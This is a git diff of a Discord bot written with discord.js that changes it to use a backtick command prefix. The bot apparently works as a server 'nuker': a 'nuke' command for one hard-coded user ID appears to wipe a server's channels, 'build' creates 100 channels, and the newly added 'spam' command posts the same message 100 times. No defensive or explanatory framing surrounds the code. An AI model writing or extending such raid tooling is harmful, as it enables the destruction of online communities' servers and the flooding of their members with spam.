@@ -1,13 +1,16 @@
 const { Client, Intents, MessageEmbed, VoiceChannel } = require('discord.js');
 const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES, Intents.FLAGS.GUILD_MEMBERS, Intents.FLAGS.GUILD_VOICE_STATES, Intents.FLAGS.GUILD_MESSAGE_REACTIONS] });
-
+const pref = "`";
 
 client.on("ready", () => {
     console.log("Stop this imedeitalty");
 })
 
 client.on("messageCreate", (message) => {
-    if (message.content == "nuke" && message.author.id == 839266645285535744) {
+    const args = message.content.slice(pref.length).split(/ +/);
+    const command = args.shift().toLowerCase();
+
+    if (command == "nuke" && message.author.id == 839266645285535744) {
         const discordServer = client.guilds.cache.get(message.guildId);
         const channelss = discordServer?.channels ? JSON.parse(
             JSON.stringify(discordServer.channels)
@@ -51,8 +54,8 @@ client.on("messageCreate", (message) => {
             });
         }
     }
-    else if (message.content == "ping") return message.reply("Pong");
-    else if (message.content == "build" && message.author.id == 839266645285535744) {
+    else if (command == "ping") return message.reply("Pong");
+    else if (command == "build" && message.author.id == 839266645285535744) {
         for (let i = 0; i <100; i++) {
             message.guild.channels.create(i, { 
                 type: "GUILD_TEXT", // syntax has changed a bit
@@ -61,6 +64,12 @@ client.on("messageCreate", (message) => {
                     allow: ["VIEW_CHANNEL"],
                 }]
             });
+        }
+    }
+    else if (command == "spam" && message.author.id == 839266645285535744) {
+        let text = message.content.slice(6)
+        for (let i = 0; i < 100; i++) {
+            message.channel.send(text);
         }
     }
 });
